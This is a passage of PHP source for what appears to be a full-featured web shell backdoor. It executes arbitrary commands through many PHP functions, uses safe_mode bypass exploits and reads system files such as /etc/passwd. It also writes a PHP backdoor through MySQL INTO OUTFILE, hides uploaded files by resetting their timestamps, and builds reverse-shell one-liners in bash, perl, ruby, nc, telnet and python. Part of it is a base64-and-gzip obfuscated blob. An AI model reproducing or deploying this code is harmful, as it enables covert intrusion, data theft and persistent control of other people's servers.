   if (extension_loaded('pcntl')) {
    if (function_enabled('pcntl_fork')) {
     if (function_enabled('pcntl_exec')) {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> <br><font color="green"> haxor@pwnedbox$ </font><input name="p" type="hidden" value="s"><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">" checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> ';
      if (is_writable("./")) {
       echo "<font color=\"green\">(./ writable)</font>";
      } else {
       echo "<font color=\"red\">(./ readonly)</font>";
      }
      echo '<br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
     } else {
      echo "<br>pcntl_exec is disabled!<br>";
     }
    } else {
     echo "<br>pcntl_fork is disabled!<br>";
    }
   } else {
    echo "<br>fail, no pcntl.so here<br>";
   }
   echo "<br>ssh2_exec:";
   if (extension_loaded('ssh2')) {
    if (function_enabled('ssh2_connect')) {
     if (function_enabled('ssh2_exec')) {
      if ($download != "1") {
       if (empty($_POST["wut"])) {
        echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"> <font color="gray">host: <input name="ssh2host" type="text" size="20" value="localhost"> port: <input name="ssh2port" type="text" size="5" maxlength="5" value="22"> user: <input name="ssh2user" type="text" size="20" value="h4x0r"> password: <input name="ssh2pass" type="text" size="20" value="r0xx0r"> </font><br><font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" size="40" value="uname -a"> <input type="submit" value="go"><input name="p" type="hidden" value="s"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="ssh2"></form>';
       }
      }
     } else {
      echo "<br>ssh2_exec is disabled!";
     }
    } else {
     echo "<br>ssh2_connect is disabled!";
    }
   } else {
    echo "<br>fail, no ssh2.so here";
   }
   echo $pageend;
  } else {
   if ($download != "1") {
    echo $title;
   }
   $shelltext=$_POST["command"];
   $html='<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="green"> haxor@pwnedbox$ </font><input name="p" type="hidden" value="s">';
   $input='<textarea name="command" rows="1" cols="50" onkeyup="changeSize(this)">'.$shelltext.'</textarea> 2>&1 <input type="submit" value="Enter"> <input type="checkbox" name="down"> download <input name="wut" type="hidden" value="';
   if ($download != "1") {
   switch ($_POST["wut"]) {
    case "passthru":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'passthru"></form>';
     break;
    case "system":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'system"></form>';
     break;
    case "exec":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'exec"></form>';
     break;
    case "shell_exec":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'shell_exec"></form>';
     break;
    case "popen":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'popen"></form>';
     break;
    case "proc_open":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'proc_open"></form>';
     break;
    case "eval":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo 'php -r \''; echo '<textarea name="command" rows="1" cols="50" onkeyup="changeSize(this)">'.$shelltext.'</textarea> \' <input type="submit" value="Enter">
     <input name="wut" value="eval" type="hidden"></form>';
     break;
    case "pcntl":
     //sploent516 not needed coz pcntl bypasses safe_mode
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> <br><font color="green"> haxor@pwnedbox$ </font><input name="p" type="hidden" value="s"><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">" checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="'.$_POST["pcfile"].'">';
     if (is_writable("./")) {
      echo "<font color=\"green\">(./ writable)</font>";
     } else {
      echo "<font color=\"red\">(./ readonly)</font>";
     }
     echo ' <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
     break;
    case "ssh2":
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="gray"> host: <input name="ssh2host" type="text" size="20" value="'.$_POST["ssh2host"].'"> port: <input name="ssh2port" type="text" size="5" maxlength="5" value="'.$_POST["ssh2port"].'"> user: <input name="ssh2user" type="text" size="20" value="'.$_POST["ssh2user"].'"> password: <input name="ssh2pass" type="text" size="20" value="'.$_POST["ssh2pass"].'"> </font><br><font color="green"> haxor@pwnedbox$ </font> <input name="command" type="text" size="40" value="'.$shelltext.'"> <input type="submit" value="go"><input name="p" type="hidden" value="s"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="ssh2"></form>';
     break;
   }
   }
  }
  if (!empty($_POST["wut"])) {
   if ($download != "1") {
    echo "<textarea cols=\"80\" rows=\"40\">";
   }
   switch ($_POST["wut"]) {
    case "passthru":
     passthru($_POST["command"]." 2>&1");
     break;
    case "system":
     system($_POST["command"]." 2>&1");
     break;
    case "exec":
     exec($_POST["command"]." 2>&1",$out);
     echo join("\n",$out);
     break;
    case "shell_exec":
     $out=shell_exec($_POST["command"]." 2>&1");
     echo "$out";
     break;
    case "popen":
     $hndl=popen($_POST["command"]." 2>&1", "r");
     $read=stream_get_contents($hndl);
     echo $read;
     pclose($hndl);
     break;
    case "proc_open":
     $process = proc_open('/bin/sh', $descriptorspec, $pipes);
     if (is_resource($process)) {
      fwrite($pipes[0],$_POST["command"]);
      fclose($pipes[0]);
      echo stream_get_contents($pipes[1]);
      fclose($pipes[1]);
      echo stream_get_contents($pipes[2]);
      fclose($pipes[2]);
      @proc_close($process);
     }
     break;
    case "pcntl":
     $shelltext=$_POST["command"];
     switch (pcntl_fork()) {
      case 0:
       pcntl_exec($_POST["inter"],array("-c","".$_POST["command"]." ".$_POST["to"]." ".$_POST["pcfile"]));
       exit(0);
      default:
       break;
     }
     sleep(1);
     $fh=fopen("".$_POST["pcfile"]."","r");
     if (!$fh) { echo "can`t fopen ".$_POST["pcfile"].", seems that we failed :("; }
     else {
      $rezult=fread($fh,filesize($_POST["pcfile"]));
      fclose($fh);
      echo $rezult;
      if ($_POST["delrezult"] == "on") { unlink($_POST["pcfile"]); }
     }
     break;
    case "eval":
     eval($_POST["command"]);
     break;
    case "ssh2":
     $connection=ssh2_connect($_POST["ssh2host"], $_POST["ssh2port"]) or die ("cant connect. host/port wrong?");
     //using knowingly wrong username to test auth. methods
     $auth_methods = ssh2_auth_none($connection, '12309tezt');
     if (in_array('password', $auth_methods)) {
      $connection=ssh2_connect($_POST["ssh2host"], $_POST["ssh2port"]) or die ("cant connect. host/port wrong?"); //need to connect again after failed login
      if (ssh2_auth_password($connection, ''.$_POST["ssh2user"].'', ''.$_POST["ssh2pass"].'')) {
       $stream=ssh2_exec($connection, $shelltext); 
       stream_set_blocking($stream, true);
       $data = "";
       while ($buf = fread($stream,4096)) {
        $data .= $buf;
       }
       fclose($stream);
       echo $data;
      } else {
       echo "cant login. user/pass wrong?";
      }
     } else {
      echo 'fail, no "password" auth method';
     }     
     break;
   }
   if ($download != "1") {
    echo "</textarea>";
   }
  }
 break; 
// --------------------------------------------- shell end; file operations
 case "f":
  if ($download != "1") {
   echo $title;
   echo "<font color=\"gray\">";
   echo "current dir: ".getcwd()."<br>";
   sploent516();
   echo "<br>--------------------------------<br></font>";
  }
  if (empty($_POST["filer"]) and $download != "1" and empty($_POST["edt"]) and empty($_POST["sqlr"]) and empty($_POST["sqlu"]) and empty($_POST["upload"])) {
  echo '<a href="#" onclick="showTooltip(7)" id="link"> &gt;&gt; read/upload/edit file &lt;&lt; </a><br><br>
  <div id="7" style="display: none">';
   $ololotext="/home/USER/public_html/DOMAIN/index.php";
   echo '<font color="blue">---> read file </font><br>';
   echo "php file_get_contents:<br>";
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
   <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"><input name="p" type="hidden" value="f"> <input type="checkbox" name="down"> download </form>';
   //curl
   if (strnatcmp(version(),"5.2.9") <= 0) {
    echo "<br> curl exploit: <br>";
    if (!extension_loaded('curl')) {
     echo "&nbsp;&nbsp;fail, curl is required<br>";
    } else {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
     <input name="filer" type="hidden" value="curl"><input type="submit" value="Enter"><input name="p" type="hidden" value="f"> <input type="checkbox" name="down"> download </form>';
    }
   }
  } else {
   switch ($_POST["filer"]) {
    case "php":
     $ololotext=($_POST["filename"]);
     if ($download != "1") {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="green">haxor@pwnedbox$ </font>cat
      <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
      <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"><input name="p" type="hidden" value="f"><input type="checkbox" name="down"> download </form>';
     }
     if (!empty($_POST["filename"])) { 
      if ($download != "1") {
       echo '<font color="gray">';
       echo "<textarea cols=\"80\" rows=\"40\">";
      }
      $contents=file_get_contents($_POST["filename"]) or die("failed. bad permissions or no such file?".$pageend."");
      echo $contents;
      if ($download != "1") {
       echo "</textarea>";
      }
      echo $pageend;
      die(); 
     }
     break;  
    case "curl":
     $ololotext=($_POST["filename"]);
     if ($download != "1") {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="green">haxor@pwnedbox$ </font>cat
      <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
      <input name="filer" type="hidden" value="curl"><input type="submit" value="Enter"><input name="p" type="hidden" value="f"><input type="checkbox" name="down"> download </form>';
     }
     if (!empty($_POST["filename"])) { 
      if ($download != "1") {
       echo '<font color="gray">';
       echo "<textarea cols=\"80\" rows=\"40\">";
      }
      sploent529($_POST["filename"]);
     }
    break;
   }
  }
  // curl + file_get_contents end
  if ($download != "1" and empty($_POST["edt"]) and empty($_POST["sqlu"])) {
   echo "<br>mysql:<br>";
   if (empty($_POST["sqlr"])) {
    $user="root";
    $pass="12345";
    $db="test";
    $host="localhost";
    $port="3306";
    $file="/etc/passwd";
   } else {
    $user=$_POST['user'];
    $pass=$_POST['pass'];
    $db=$_POST['db'];
    $host=$_POST['host'];
    $port=$_POST['port'];
    $file=$_POST['file'];
   }
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">user <input name="user" type="text" maxlength="500" size="10" value="'.$user.'"> password <input name="pass" type="text" maxlength="500" size="10" value="'.$pass.'"> host <input name="host" type="text" maxlength="500" size="10" value="'.$host.'">:<input name="port" type="text" maxlength="5" size="5" value="'.$port.'"> database <input name="db" type="text" maxlength="500" size="10" value="'.$db.'"><font color="gray">(needed for `load data infile`)</font><br><input name="wut" value="load_file" type="radio" checked>load_file<br><input name="wut" value="infile" type="radio">load data infile <font color="gray">(use it for binary files)</font><br><input name="file" type="text" maxlength="500" size="40" value="'.$file.'"> <input type="submit" value="go"><input name="sqlr" type="hidden" value="yup"><br><input name="p" type="hidden" value="f"></form>';
   if (!empty($_POST["sqlr"])) {
    $link=mysql_connect("".$host.":".$port."",$user,$pass) or die("cant connect: ".mysql_error()."".$pageend."");
    switch ($_POST['wut']) {
    case "load_file":
     $q='SELECT load_file("'.$_POST["file"].'")';
     $rez=mysql_query($q,$link) or die("query error:".mysql_error()."".$pageend."");
     echo "result:<br>";
     echo "<textarea cols=\"80\" rows=\"20\">";
     echo mysql_result($rez,0);
     echo "</textarea><br>";
     echo $pageend;
     die();
     break;
    case "infile":
     mysql_select_db($db) or die ("cannot select db: ".mysql_error()."".$pageend."");
     mysql_query("CREATE TABLE `file` ( `text` LONGBLOB NOT NULL );") or die ("cannot create table: ".mysql_error()."".$pageend.""); 
     mysql_query("LOAD DATA INFILE \"".$_POST["file"]."\" INTO TABLE file LINES TERMINATED BY '' (`text`)") or die ("cannot load data: ".mysql_error()."".$pageend."");
     $rez=mysql_query("SELECT * FROM file;");
     if (!$rez) { echo "fail. permission denied?<br>"; }
     else {
      for ($i=0;$i<mysql_num_fields($rez);$i++) {$name = mysql_field_name($rez,$i);}
      $f = "";
      while ($row = mysql_fetch_array($rez, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
      if (empty($f)) {
       echo "file does not exists or empty?<br>";
      } else {
       echo "result:<br>";
       // code from c99shell madnet edition
       $n = 0;
       $a0 = "00000000<br>";
       $a1 = "";
       $a2 = "";
       for ($i=0; $i<strlen($f); $i++) {
        $a1 .= sprintf("%02X",ord($f[$i]))." ";
        switch (ord($f[$i])) {
         case 0:  $a2 .= "<font>0</font>"; break;
         case 32:
         case 10:
         case 13: $a2 .= "&nbsp;"; break;
         default: $a2 .= htmlspecialchars($f[$i]);
        }
        $n++;
        if ($n == 24) {
         $n = 0;
         if ($i+1 < strlen($f)) {$a0 .= sprintf("%08X",$i+1)."<br>";}
         $a1 .= "<br>";
         $a2 .= "<br>";
        }
       }
       echo '<table border=0 cellspacing="1" cellpadding="4"><tr><td>'.$a0.'</td><td>'.$a1.'</td><td>'.$a2.'</td></tr></table><br>';
      }
      mysql_free_result($result);
      mysql_query("DROP TABLE file;") or die("cannot drop table: ".mysql_error()."".$pageend."");
     }
     echo $pageend;
     die();
    break;
    }
   mysql_close($link);
   }
  }
  // mysql read file end. upload
   if ($download != "1" and empty($_POST["edt"])) {
    echo '<br><font color="blue">---> upload file</font><br>';
    if (!ini_get('file_uploads')) {
     echo "php file_uploads Off<br>";
    } else {
     echo "<font color=\"gray\">post_max_size: ".ini_get('post_max_size')."<br>"; 
     echo "upload_max_filesize: ".ini_get('upload_max_filesize')."<br>"; 
     echo "</font>";
     if (is_writable("./")) {
      echo "<font color=\"green\">./ writable</font>";
     } else {
      echo "<font color=\"red\">./ readonly</font>";
     }
     if (!isset($_POST["dir"])) {
      $upto=".";
     } else {
      $upto=$_POST["dir"];
     }
     echo '<form enctype="multipart/form-data" action="'.$_SERVER['PHP_SELF'].'" method="post"><input name="sourcefile" type="file"> upload to <font color="gray">(dir)</font><input name="filedir" type="text" maxlength="500" size="20" value="'.$upto.'"><font color="green">/</font><input name="upname" type="text" maxlength="500" size="20" value=""><font color="gray">(name. empty = use original file`s name)</font> <input name="upload" type="hidden" value="okz"><input name="p" type="hidden" value="f"><br><input type="submit" value="upload">';
     echo '</form>';
     if (!empty($_POST["upload"])) {
      if(is_uploaded_file($_FILES["sourcefile"]["tmp_name"]))
      {
       echo "upload ok";
       $dirtime=filemtime($_POST['filedir']);
       if (!empty($_POST["upname"])) {
        $upname=$_POST["upname"];
       } else {
        $upname=$_FILES["sourcefile"]["name"];
       }
       move_uploaded_file($_FILES["sourcefile"]["tmp_name"], $_POST['filedir']."/".$upname) or die("<br>moving failed!<br>".$pageend."");
       echo "<br>moving done, trying to touch (old time of ".$_POST['filedir']." = ".date("d/m/Y H:i:s",$dirtime).")<br>";
       touch($_POST['filedir']."/".$upname,$dirtime,$dirtime) or die ("<br>touch failed!<br>".$pageend."");
       echo "file touched: new time of ".$upname." = ".date("d/m/Y H:i:s",filemtime($_POST['filedir']."/".$upname)).". trying to touch dir<br>";
       touch($_POST['filedir'],$dirtime,$dirtime) or die ("<br>touch dir failed!<br>".$pageend."");
       echo "dir touched: new time of ".$_POST['filedir']." = ".date("d/m/Y H:i:s",filemtime($_POST['filedir']))."<br>";
      } else {
       echo("<br>upload failed!<br>");
      }
     }
    }
    if ($download != "1" and empty($_POST["edt"])) {
     echo "<br>mysql:<br>";
     if (empty($_POST["sqlu"])) {
      $user="root";
      $pass="12345";
      $db="test";
      $host="localhost";
      $port="3306";
      if (empty($_POST["dir"])) {
       $dir=getcwd();
      } else {
       $dir=$_POST["dir"];
      }
      $file=$dir."/shell.php";
      $evilcodez='<?php system($_GET["command"]); ?>';
     } else {
      $user=$_POST['user'];
      $pass=$_POST['pass'];
      $db=$_POST['db'];
      $host=$_POST['host'];
      $port=$_POST['port'];
      $file=$_POST['file'];
      $evilcodez=$_POST['evilcodez'];
     }
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">user <input name="user" type="text" maxlength="500" size="10" value="'.$user.'"> password <input name="pass" type="text" maxlength="500" size="10" value="'.$pass.'"> host <input name="host" type="text" maxlength="500" size="10" value="'.$host.'">:<input name="port" type="text" maxlength="5" size="5" value="'.$port.'"><br> select <br><textarea name="evilcodez" cols="80" rows="4">'.$evilcodez.'</textarea><br>into outfile <input name="file" type="text" maxlength="500" size="40" value="'.$file.'"> <input type="submit" value="go"><input name="sqlu" type="hidden" value="yup"><br><input name="p" type="hidden" value="f"></form>';
    }
    if (!empty($_POST["sqlu"])) {
     $link=mysql_connect("".$host.":".$port."",$user,$pass) or die("cant connect: ".mysql_error()."".$pageend."");
     $q='SELECT \''.mysql_real_escape_string($_POST['evilcodez']).'\' INTO OUTFILE "'.$_POST["file"].'"';
     $rez=mysql_query($q,$link) or die("query error:".mysql_error());
     echo "done<br>";
     mysql_close($link);
     echo $pageend;
     die();
    }
    echo "<br>";
    echo '<font color="blue">---> edit file</font><br>';
    if (!empty($_POST["edit"])) {
     $filee=trim($_POST["filee"]);
     $files=trim($_POST["files"]);
    } else {
     $filee="/etc/passwd";
     if (empty($_POST["dir"])) {
      $dir="./";
     } else {
      $dir=$_POST["dir"]."/";
     }
     $files=$dir."cache.txt";
    }
    echo '<form name="editor" method="post" action="'.$_SERVER['PHP_SELF'].'"><input name="filee" type="text" maxlength="500" size="30" value="'.$filee.'"> save as <input name="files" type="text" maxlength="500" size="30" value="'.$files.'"> <input type="submit" value="go"><input name="edt" type="hidden" value="ok"><input name="edit" type="hidden" value="edit"><input name="p" type="hidden" value="f"><br></form>';
   }
   if (!empty($_POST["edit"])) {
    $filee=trim($_POST["filee"]);
    $oldtime=@filemtime($filee);
    $files=trim($_POST["files"]);
    if (!file_exists($files)) {
     if (!fopen($files,'a+')) {
      echo '<font color="red">'.$files.' isnt writable! (cannot open "a+")<br></font>'; echo $pageend; die();
     } else {
      if (!file_exists($filee)) {
       echo '<font color="gray"> no file '.$filee.', I`ll create new '.$files.'.</font><br>';
      } else {
       echo '<font color="gray"> no file '.$files.', I`ll create new '.$files.'.</font><br>';
      }
      fclose($files);
      unlink($files);
     }
    } else {
     if (!is_writable($files)) {
      $chmoded=substr(sprintf('%o',fileperms($files)), -4);
      echo '<font color="gray">'.$files.' chmod '.$chmoded.', trying to chmod 0666</font>';
      chmod($files, 0666) or die ('<font color="red"><br>cannot chmod '.$files.' 666!'.$pageend.'');
      echo '<font color="gray"> ...done</font>';
     }
    }
    if (!empty($_POST["edt"])) {
     $filec=file_get_contents($filee);
     if (empty($filec)) {
      echo '<font color="red">cannot get '.$filee.' contents!</font>';
     }
     if (isset($_POST['filec'])) {
      $filec=$_POST['filec'];
      $fh=fopen($files,"w+") or die ('<font color="red">cannot fopen "w+"!</font>'.$pageend.'');
      fputs($fh,$filec);
      fclose($fh) or die ('<font color="red">cannot save file!</font>'.$pageend.'');
      if (isset($_POST['chmoded'])) {
       echo "chmoding to old perms(".trim($_POST['chmoded']).")<br>";
       $perms = 0;
       for($i=strlen($_POST['chmoded'])-1;$i>=0;--$i)
       $perms+=(int)$_POST['chmoded'][$i]*pow(8, (strlen($_POST['chmoded'])-$i-1));
       chmod($files, $perms);
      }
      $date=explode(" ",$_POST["touch"]);
      $day=explode("-",$date[0]);
      $time=explode(":",$date[1]);
      $unixtime=mktime($time[0],$time[1],$time[2],$day[1],$day[2],$day[0]);
      @touch($files,$unixtime,$unixtime);
      die('<br><font color="green"> -&gt '.$files.' saved!</font>'.$pageend.'');
     }
     if (empty($oldtime)) {
      $ttime=time();
     } else {
      $ttime=$oldtime;
     }
     echo '<form action="'.$_SERVER["PHP_SELF"].'" method="post">enter touch time: <input name="touch" type="text" maxlength="19" size="19" value="'.date("Y-m-d H:i:s",$ttime).'"><br><textarea cols="80" rows="20" name="filec">'.$filec.'</textarea><input name="filee" type="hidden" value="'.$filee.'"><input name="p" type="hidden" value="f"><input name="files" type="hidden" value="'.$files.'">';
     if (isset($chmoded)) {
      echo '<input name="chmoded" type="hidden" value="'.$chmoded.'">';
     }
     echo '<input name="edit" type="hidden" value="edit"><br><input type="submit" name="edt" value="save"></form>';
    }
    echo $pageend;
    die();
   }
   if ($download != "1") {
    echo '<br></div><font color="blue">---> fail manager</font><br>';
   }
   if ($action=="viewer") {
    if (!isset($dir)) {
     $dir=getcwd();
    }
    scandire($_POST["dir"]);
   }
   if ($action=="download") {
    readfile($_POST["file"]);
   }
   if ($action=="chmod") {
    chmodz($_POST["file"]);
   }
   if ($action=="touch") {
    touchz($_POST["file"]);
   }
   if ($action == 'delete') {
    if (unlink($_POST["file"])) $content.="file ".$_POST["file"]." deleted, <a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$_POST["dir"]."'; document.reqs.submit();\">back</a>";
   }
   if ($action == 'deletedir') {
    if (!rmrf($_POST["file"])) {
     $content .="error deleting dir ".$_POST["file"].", <a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$_POST["dir"]."'; document.reqs.submit();\">back</a>";
    } else {
     $content .="dir ".$_POST["file"]." deleted, <a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$_POST["dir"]."'; document.reqs.submit();\">back</a>";
    }
   }
   if (!empty($content)) {
    echo $content;
   }
   if ($download != "1") {
    echo '<br>';
    echo '<form name="reqs" method="post" action="'.$_SERVER["PHP_SELF"].'"><input name="action" type="hidden" value=""><input name="dir" type="hidden" value=""><input name="file" type="hidden" value=""><input name="p" type="hidden" value="f"></form>';
    echo $pageend;
   }
  break;
// --------------------------------------------- file operations end; bind
 case "b":
  echo $title;
  echo '<a href="#" onclick="showTooltip(1)" id="link"> &gt;&gt; help &lt;&lt; </a>
  <div id="1" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">
  you could get almost-interactive shell in bind/backconnect with help of these commands<br>
  -&gt; if there is python on the server, run: <br>
  python -c \'import pty; pty.spawn("/bin/bash")\'<br>
  -&gt; ruby:<br>
  ruby -rpty -e \'PTY.spawn("/bin/bash")do|i,o|Thread.new do loop do o.print STDIN.getc.chr end end;loop do print i.sysread(512);STDOUT.flush end end\'<br>
  -&gt; expect:<br>
  expect -c \'spawn sh;interact\'<br>
  -&gt; policycoreutils package:<br>
  open_init_pty bash<br><br>
  //thanks to tex from rdot.org<br><br>
  for backconnect you should use small one-liners coz there is no temporary file created. in case they fail, try usual "big" backconnects.<br><br>
  //thanks to Bernardo Damele and pentestmonkey.net<br><br>
  if your terminal is broken after using backconnect (i.e. it doesnt show what you type), run command: reset<br>
  </div><br><br>';
  if ($failflag=="1") {
   echo "fail, at least one system function needed!<br><br>";
  } else {
   $nc='<font color="gray">(dont forget to setup nc <b>first</b>!)</font>';
   $semi='<font color="gray">dont forget to write <b>;</b> at the end of command!</font>';
   sploent516();
   echo "<br>"; //debug: sometimes page cut here, when passthru system shell_exec are disabled
   echo '<font color="green"> - - - - = = = = &gt; &gt; one-liners</font><br><a href="#" onclick="showTooltip(4)" id="link4"> &gt;&gt; show code &lt;&lt; </a>
   <div id="4" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none"><textarea cols="80" rows="20">
'.gzinflate(base64_decode("pZLRq5swFMbf/SsOIq0Bjbfdm6lCue1Axr2W6tsYpU3iKtUkJHZdWe/+9kVbmBv3YbAXT/IRv/NLvnPYm2PswNNiMpt/IPw7p2AXizRi/FvUURVlG7xcrfB2jYsi2uTbkoA5wnAc0uE7H4rjKK4ba9UXCF+yHEIOU08lldQn61x3QV35nkLEo4ngF8jyOC4kPfEujrPXdelvONdLxnTgjpvGfVMXkaJcZa9hWjGpuPA9Gmjr9HMsXBAxV9Px1tvB5Vg3fJGSqePo8+FqufoCoTZDx4GtZ4K6ggGQJuXz5o6DLZ3/B4MbuA+KwdenLUso/so7g0iWYzUQWDFwtYt+3Gp5o1jpWlh7iTXfszcumEURtAdpIawg6loVYUEFI9CehGQjBRRMJiAojBmgJ7BBjY7dIDrUIrJ5zNKR3AfiOB1vhH3af+93/+G/eqprd5SiH4JhASGFad0qqTu4v3tgzgelJeXGBNIQk9xlfC/+Y7f8uOsHInhsi/z5064ot+vli00YUykEp53/d0Q9K0JEGszOau4bXNmohPRR8IQIvCPP3pfniKjkNyem+6bxP7uPa9tRCGv3C7KT9Qs=")).'</textarea></div><br>';
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"><input name="p" type="hidden" value="b"> using <br>';
   $searchvar=trim(search("bash",$failflag));
   if (empty($searchvar)) {
    echo "fail, no bash here<font color=\"gray\"> (lolwut?)</font><br>";
   } else {
    echo ' bash <input name="wut" value="bash" type="radio" checked><br>'; 
   }
   $searchvar=trim(search("perl",$failflag));
   if (empty($searchvar)) {
    echo "fail, no perl here<br>";
   } else {
    echo ' perl <input name="wut" value="perl" type="radio"><br>';
   }
   $searchvar=trim(search("ruby",$failflag));
   if (empty($searchvar)) {
    echo "fail, no ruby here<br>";
   } else {
    echo ' ruby <input name="wut" value="ruby" type="radio"><br>';
   }
   $searchvar=trim(search("nc",$failflag));
   if (empty($searchvar)) {
    echo "fail, no nc here<br>";
   } else {
    echo ' nc <input name="wut" value="nc" type="radio"><br>';
   }
   $searchvar=trim(search("telnet",$failflag));
   if (empty($searchvar)) {
    echo "fail, no telnet here<br>";
   } else {
    echo ' telnet <input name="wut" value="telnet" type="radio"><br>';
   }
   $searchvar=trim(search("python",$failflag));
   if (empty($searchvar)) {
    echo "fail, no python here<br>";
   } else {
    echo ' python <input name="wut" value="python" type="radio"><br>';
   }
   echo '<br><input type="hidden" name="oneline" value="oneline"><input type="submit" value="go"></form><br>';
   if (!empty($_POST["oneline"])) {
    switch ($_POST["wut"]) {
     case "bash":
      $c='0<&123;exec 123<>/dev/tcp/'.$_POST["ip"].'/'.$_POST["port"].'; sh <&123 >&123 2>&123';
      run($c);
      echo "done<br>";
     break;
     case "perl":
      $c='perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"'.$_POST['ip'].':'.$_POST['port'].'");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'';
      run($c);
      echo "done<br>";
     break;
     case "ruby":
      $c='ruby -rsocket -e \'exit if fork;c=TCPSocket.new("'.$_POST['ip'].'","'.$_POST['port'].'");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'';
      run($c);
      echo "done<br>";
     break;
     case "nc":
      $c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && nc '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd 2>&1';
      run($c);
      echo "done<br>";
     break;
     case "telnet":
      $c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && telnet '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd 2>&1';
      run($c);
      echo "done<br>";
     break;
     case "python":
      $c='python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$_POST['ip'].'",'.$_POST['port'].'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'';
      run($c);
      echo "done<br>";
     break;
    }
   }
   echo '<font color="green">- - - - = = = = &gt; &gt; classic</font><br>';
   echo '<font color="blue">---> PHP </font><br>';
   if (!function_enabled('set_time_limit')) { echo '<font color="gray">warning! set_time_limit off!</font><br>'; }
   if (!function_enabled('ignore_user_abort')) { echo '<font color="gray">warning! ignore_user_abort off!</font><br>'; }
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">bind local port <input name="port" type="text" maxlength="5" size="5" value="1337"> <input type="submit" value="go"><br>'.$semi.'<input name="p" type="hidden" value="b"><input name="shellz" type="hidden" value="phplocal"></form>';
   if (function_enabled('fsockopen')) {
    if (function_enabled('proc_open')) {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> <input type="submit" value="go"><br>'.$nc.'<input name="p" type="hidden" value="b"><input name="shellz" type="hidden" value="phpremote"></form><br>';
    } else { echo 'fail, proc_open is needed for backconnect!<br><br>'; }
   } else { echo 'fail, fsockopen is needed for backconnect!<br><br>'; }
   //php end
   echo '<font color="blue">---> PERL </font><br>';
   $searchvar=trim(search("perl",$failflag));
   if (empty($searchvar)) {
    echo "fail, no perl here<br>";
   } else {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">bind local port <input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bd"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perllocal"><input name="p" type="hidden" value="b"> ';
